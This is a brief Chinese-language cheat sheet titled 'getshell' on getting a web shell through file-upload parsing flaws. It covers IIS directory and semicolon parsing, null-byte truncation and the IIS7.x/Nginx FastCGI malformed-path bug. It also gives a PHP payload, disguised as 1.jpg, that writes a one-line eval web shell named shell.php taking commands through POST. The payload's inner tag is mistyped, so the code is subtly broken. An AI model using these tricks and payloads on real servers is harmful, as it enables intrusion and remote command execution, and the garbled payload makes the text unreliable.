## getshell
目录解析 1.asp/1.png
分号阶段 1.asp;.png
改包 00截断

IIS7.0 .5 Nginx<8.03畸形解析漏洞
默认FAST-CGI开启状态上传一个1.jpg内容
```php
<?php fputs(fopen('shell.php','w'),'?<php eval($_POST[cmd]?>');?>
```

访问1.jpg/.php。在这个目录下就会生成一句话木马shell.php
